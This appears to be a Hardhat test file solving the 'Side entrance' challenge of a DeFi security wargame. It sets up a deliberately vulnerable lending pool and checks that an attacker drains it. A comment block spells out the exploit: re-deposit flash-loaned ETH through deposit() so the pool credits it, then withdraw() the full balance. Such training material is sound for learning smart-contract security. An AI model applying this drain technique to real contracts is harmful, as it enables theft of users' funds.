const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    // ------------------------------------------ EXPLOIT ------------------------------------------
    // 1. Call 'flashLoan()'
    // 2. Lending pool calls 'execute()' in the receiver contract and sends ETH
    // 3. Receiver contract deposits ETH from flash loan back into the lending pool by calling 'deposit()'
    // 4. 'flashLoan()' call is complete with 'balances' mapping updated as a result of the last step
    // 5. Receiver contract calls 'withdraw()' to drain the ETH in the lending pool 
    // ---------------------------------------------------------------------------------------------
    it('Exploit', async function () {
        const SideEntranceExploit = await ethers.getContractFactory('SideEntranceExploit', deployer);
        this.exploit = await SideEntranceExploit.deploy();
        await this.exploit.exploit(this.pool.address, ETHER_IN_POOL, attacker.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
